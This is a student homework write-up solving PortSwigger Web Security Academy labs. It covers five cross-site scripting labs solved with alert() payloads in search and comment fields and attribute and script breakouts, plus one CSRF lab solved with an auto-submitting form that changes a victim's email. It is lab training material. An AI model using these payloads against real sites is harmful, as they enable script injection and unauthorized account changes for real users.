# Homework 12. Client Side Attacks

## XSS

### Task 1

The [lab](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded) is solved by passing malicious payload as search parameter:

```js
    <script>alert('hacked')</script>
```

![task1-payload](taks1-payload.png)

![task1-result](task1-result.png)

![task1-solved](task1-solved.png)

### Task 2

The [lab](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded) is solved by passing malicious payload to comment:

![task2-payload](task2-payload.png)

![task2-result](task2-result.png)

![task2-solved](task3-solved.png)

### Task 3

The [lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink) is solved by passing malicious payload payload as search parameter:

![task3-payload](task3-payload.png)

The payload as added as DOM element:

![task3-dom](task3-dom.png)

And the script is executed:

![task3-result](task3-result.png)

And the lab is solved:

![task3-solved](task3-solved.png)

### Task 4

In this [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded) the search parameter is set to `value` attribute of input element:

![task4-dom](task4-dom.png)

So we can pass malicious payload and modify `input` attributes. The payload:

```html
"onmouseover="alert(1)
```

![task4-dom2](task4-dom2.png)

Hovering mouse over input field triggers alert:

![task4-result](task4-result.png)

The lab is solved:

![task4-solved](task4-solved.png)

### Task 5

In this lab [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped) the input is stored in the variable `searchTerms`:

![task5-dom](task5-dom.png)

The malicious payload should close previous script and create a new one:

```html
</script><script>alert(1)</script>
```

![task5-dom2](task5-dom2.png)

It triggers the alert:

![task5-result](task5-result.png)

The lab is solved:

![task5-solved](task5-solved.png)

## CSRF

### Task 6

This [lab](https://portswigger.net/web-security/csrf/lab-no-defenses) is solved by providing html form to exploit server. Once the form is delivered to victim it is automatically submitted by script and email should be changed:

```html
<html>
 <body>
  <form method="POST" action="https://0a3400a603c14083817c753d00c200a1.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="victim@normal-user.net"/>
    <input type="submit" value="Submit">
  </form>
  </body>
  <script>
    document.forms[0].submit();
  </script>
<html>
```

![lab6-solved](lab6-solved.png)
